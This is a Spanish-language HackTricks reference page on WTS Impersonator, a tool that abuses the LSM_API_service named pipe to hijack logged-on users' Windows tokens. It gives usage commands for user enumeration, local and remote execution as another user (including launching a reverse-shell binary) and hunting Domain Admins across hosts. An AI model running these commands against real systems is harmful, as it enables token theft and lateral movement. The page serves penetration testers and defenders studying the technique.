{{#include ../../banners/hacktricks-training.md}}

La herramienta **WTS Impersonator** explota el **"\\pipe\LSM_API_service"** RPC Named pipe para enumerar sigilosamente a los usuarios conectados y secuestrar sus tokens, eludiendo las técnicas tradicionales de suplantación de tokens. Este enfoque facilita movimientos laterales sin problemas dentro de las redes. La innovación detrás de esta técnica se atribuye a **Omri Baso, cuyo trabajo es accesible en [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Funcionalidad Principal

La herramienta opera a través de una secuencia de llamadas a la API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Módulos Clave y Uso

- **Enumerando Usuarios**: La enumeración de usuarios locales y remotos es posible con la herramienta, utilizando comandos para cada escenario:

- Localmente:
```powershell
.\WTSImpersonator.exe -m enum
```
- Remotamente, especificando una dirección IP o nombre de host:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Ejecutando Comandos**: Los módulos `exec` y `exec-remote` requieren un contexto de **Servicio** para funcionar. La ejecución local simplemente necesita el ejecutable WTSImpersonator y un comando:

- Ejemplo de ejecución de comando local:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe se puede usar para obtener un contexto de servicio:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Ejecución Remota de Comandos**: Implica crear e instalar un servicio de forma remota similar a PsExec.exe, permitiendo la ejecución con los permisos apropiados.

- Ejemplo de ejecución remota:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Módulo de Caza de Usuarios**: Apunta a usuarios específicos en múltiples máquinas, ejecutando código bajo sus credenciales. Esto es especialmente útil para apuntar a Administradores de Dominio con derechos de administrador local en varios sistemas.
- Ejemplo de uso:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
